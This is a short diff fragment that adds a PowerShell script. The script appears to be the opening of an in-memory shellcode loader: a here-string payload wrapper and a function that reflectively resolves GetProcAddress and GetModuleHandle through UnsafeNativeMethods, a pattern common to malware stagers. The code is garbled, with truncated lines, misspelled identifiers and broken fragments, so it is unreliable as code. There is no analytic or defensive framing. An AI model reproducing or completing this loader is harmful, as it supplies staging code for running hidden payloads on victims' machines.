@@ -1,0 +1,10 @@
+Set-StrictMode -Version 2
+
+$DoIt = @'
+function func_get_proc_address {
+	Param ($var_module, $var_procedure)
+	$var_unsafe_native_methods = ([AppDomain]::CurrentDOmain.GetAssemblies() | Where-Object   
+32.UnsafeNativeMethods')
+
+	return $var_unsafe_native_methods.GetMethod('GetProcAddress').Invoke($null, @([Ssytem.Run
+, ($var_unsafe_native_metods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))),$va
